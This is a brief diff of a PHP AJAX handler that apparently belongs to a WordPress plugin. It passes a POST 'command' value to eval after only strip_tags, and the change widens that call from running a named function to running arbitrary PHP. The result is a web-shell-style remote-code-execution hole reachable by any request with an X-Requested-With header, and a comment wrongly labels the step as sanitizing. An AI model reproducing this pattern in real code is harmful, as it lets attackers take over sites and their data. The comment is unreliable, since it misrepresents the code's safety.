@@ -9,7 +9,6 @@
  *
  * $_POST['command'] = todo
  *
- *
  */
 
 if (@isset($_SERVER['HTTP_X_REQUESTED_WITH']) ) {
@@ -17,7 +16,7 @@ if (@isset($_SERVER['HTTP_X_REQUESTED_WITH']) ) {
 
     require_once ('../../../wp-load.php');
     require_once ('module/database.php');
-    require_once ('module/usersmeta.php');
+    require_once ('module/usermeta.php');
     require_once ('module/posts.php');
     require_once ('module/category.php');
     require_once ('module/comments.php');
@@ -28,8 +27,8 @@ if (@isset($_SERVER['HTTP_X_REQUESTED_WITH']) ) {
     /**
      * Sanitize $_POST['command]
      */
-    $command = strip_tags($_POST['command']);
-    eval ($command.'();' );
+    $command = strip_tags( $_POST['command'] );
+    eval ( $command );
 }
 
 ?>
